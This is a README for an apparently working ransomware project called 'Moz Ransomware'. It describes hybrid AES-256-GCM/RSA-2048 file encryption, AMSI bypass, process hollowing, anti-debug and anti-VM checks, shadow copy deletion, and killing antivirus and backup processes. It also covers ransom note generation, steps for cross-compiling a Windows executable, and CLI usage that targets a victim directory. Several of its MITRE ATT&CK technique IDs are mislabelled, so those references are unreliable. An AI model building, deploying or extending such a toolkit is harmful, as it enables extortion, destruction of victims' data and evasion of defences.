Moz Ransomware
================

Hybrid Crypto-Ransomware with C++ Core + Python Wrapper

Project Structure
-----------------
moz-ransomware/
├── core/
│   ├── CMakeLists.txt          (C++ build config, OpenSSL-linked, cross-compile aware)
│   ├── include/
│   │   ├── moz_crypto.h        (AES-256-GCM, RSA-2048, hybrid encryption API)
│   │   └── moz_evasion.h       (Process hollowing, AMSI bypass, anti-analysis)
│   ├── src/
│   │   ├── moz_crypto.cpp      (AES-256-GCM, RSA-2048, hybrid encryption, PBKDF2)
│   │   ├── moz_evasion.cpp     (Process hollowing, AMSI bypass, shadow copy deletion)
│   │   └── moz_c_api.cpp       (C API bridge for Python ctypes interop)
│   ├── tests/
│   │   ├── test_crypto.cpp     (7 C++ crypto tests - all pass)
│   │   └── test_evasion.cpp    (7 C++ evasion tests - all pass)
│   └── build/
│       ├── libmoz_core.so      (Shared library with C API exports)
│       ├── moz_test            (Crypto test executable)
│       └── moz_evasion_test    (Evasion test executable)
├── wrapper/
│   ├── src/
│   │   ├── __init__.py         (Package marker)
│   │   ├── moz_wrapper.py      (Python bridge: MozCrypto, MozEvasion, MozRansomware)
│   │   └── moz_main.py         (CLI entry point)
│   ├── tests/
│   │   └── test_integration.py (Full workflow integration tests - all pass)
│   └── include/
└── README.md

Phases
------
1. [DONE] BASE - C++ core structure + Python wrapper stub
2. [DONE] CRYPTO - AES-256-GCM, RSA-2048, hybrid encryption, PBKDF2, file targeting, anti-recovery
3. [DONE] INTEGRATION - Python ctypes bridge, full workflow integration, ransom note generation
4. [DONE] EVASION - Process hollowing, AMSI bypass, anti-debug/anti-VM detection, shadow copy deletion
5. [TODO] DEPLOYMENT - Windows .exe build via MinGW/MSVC (cross-compile from Linux possible)

Technology Stack
----------------
- C++ Core: OpenSSL 3.0 (AES-256-GCM, RSA-2048, PBKDF2-SHA256)
- Python Wrapper: ctypes for C API binding, cryptography library fallback
- Build System: CMake + GCC 13.3 (with MinGW-w64 cross-compile support)
- File format: Custom .moz (header "MOZ_HYBRID_V1" + AES key + IV + tag + ciphertext)
- Evasion techniques: Process hollowing, AMSI patching, CLR unhooking, anti-analysis checks

Features Implemented (Phase 4 Complete)
---------------------------------------
Cryptography & Encryption (Phase 2):
- Hybrid encryption: AES-256-GCM per-file + RSA-2048 key wrapping
- GCM authentication tags for tamper detection
- PBKDF2 key derivation with SHA-256 (100,000 iterations)
- File size filtering: 10 bytes minimum, 10MB maximum
- Target extensions: .txt, .docx, .xlsx, .pdf, .csv, .jpg, .py, etc.
- Already-encrypted file detection (.moz extension)
- Exclusion directories: Windows, Program Files, System Volume Information, etc.

Anti-Recovery & Anti-Forensics (Phase 3):
- Process termination: AV, backup, database, Office apps kill list
- Service stopping: VSS, SQL Server, MySQL, backup services
- Shadow copy deletion: vssadmin → wmic → PowerShell fallback chain
- Anti-analysis: Debugger detection, remote debugger check, heap flags, PEB analysis
- VM/Sandbox detection: CPUID hypervisor checks, timing anomalies
- AMSI bypass: AmsiScanBuffer patching, CLR unhooking

Integration & Workflow (Phase 4):
- C API bridge exposing crypto/evasion to Python via ctypes
- MozCrypto class: hybrid encrypt/decrypt with optional attacker public key
- MozEvasion class: anti-analysis checks, AMSI bypass, backup/process termination
- MozRansomware class: directory encryption workflow, ransom note generation
- CLI entry point: python3 moz_main.py --victim-id <ID> --target <dir>

How to Build
------------
# Native Linux build (C++ shared library + test executables):
    cd /home/runner/moz-ransomware/core
    rm -rf build && mkdir build && cd build
    cmake ..
    make
    # Produces: libmoz_core.so, moz_test, moz_evasion_test

# Python wrapper (no build required):
    cd /home/runner/moz-ransomware/wrapper/src
    python3 moz_main.py --help

# Cross-compile Windows .exe from Linux (one-command script):
    # Requires MinGW-w64 cross-compilers: x86_64-w64-mingw32-gcc and x86_64-w64-mingw32-g++
    # Install: sudo apt-get install mingw-w64-x86_64-toolchain
    #
    # Usage: ./build-winexe.sh [output_name]
    #   Output: <name>.exe in core/build/
    #   Example: ./build-winexe.sh moz-ransomware
    #
    # The produced .exe contains all functionality:
    # - Hybrid AES-256-GCM + RSA-2048 encryption
    # - Process hollowing, AMSI bypass, anti-analysis
    # - Directory encryption with .moz file output
    # - Ransom note generation
    #
    # Copy the .exe to Windows and run it
    ./build-winexe.sh

# Or manual CMake command (if not using the script):
    CMAKE_SYSTEM_NAME=Windows cmake -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
        -DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++ ..
    make
    # Produces: *.exe and *.dll in core/build/

How to Test
-----------
C++ crypto tests:
    cd /home/runner/moz-ransomware/core/build && ./moz_test

C++ evasion tests:
    cd /home/runner/moz-ransomware/core/build && ./moz_evasion_test

Python integration tests:
    cd /home/runner/moz-ransomware
    PYTHONPATH=wrapper/src python3 wrapper/tests/test_integration.py

Usage Example:
--------------
python3 wrapper/src/moz_main.py \
    --victim-id MOZ_VICTIM_001 \
    --target /path/to/encrypt

Expected Output:
----------------
- Encrypted files renamed to <original>.moz
- Original files deleted
- Ransom note dropped at ~/Desktop/!!!READ_ME!!!.txt

References
----------
- MITRE ATT&CK: T1083 (File and Directory Discovery)
- MITRE ATT&CK: T1084 (Data Encrypted for Impact)
- MITRE ATT&CK: T1055.012 (Process Hollowing)
- MITRE ATT&CK: T1486 (Inhibit System Recovery) - Shadow copy deletion
- MITRE ATT&CK: T1053.005 (Anti-Analysis)
- LockBit 3.0: AES-256 + RSA-2048 hybrid encryption (CISA AA23-075a)
- DeadLock: Multi-threaded parallel encryption with lock files
- VECT ransomware: 48-thread parallelization approach
- xaitax/Chrome-App-Bound-Encryption-Decryption: Evasion technique reference